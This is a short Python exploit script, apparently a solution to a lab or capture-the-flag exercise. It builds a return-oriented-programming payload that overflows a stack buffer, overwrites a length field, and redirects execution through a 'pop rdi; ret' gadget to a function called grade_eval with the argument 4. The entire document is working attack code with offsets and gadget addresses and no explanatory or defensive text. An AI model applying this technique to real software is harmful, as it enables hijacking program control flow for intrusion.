import sys
import struct

pop_rdi_ret = 0x4018a3
grade_eval  = 0x401677
len_field   = 168          # logMsg(rbp-0xa0) 到返回地址(rbp+8) 的偏移 = 0xa8

# ROP 链：pop rdi; ret -> 4 -> grade_eval
rop = struct.pack("<Q", pop_rdi_ret) + struct.pack("<Q", 4) + struct.pack("<Q", grade_eval)

# expression[24..255] 填充 232 字节，然后 f.len = 168
payload = rop + b"\x90" * 232 + struct.pack("<I", len_field)

sys.stdout.buffer.write(payload)
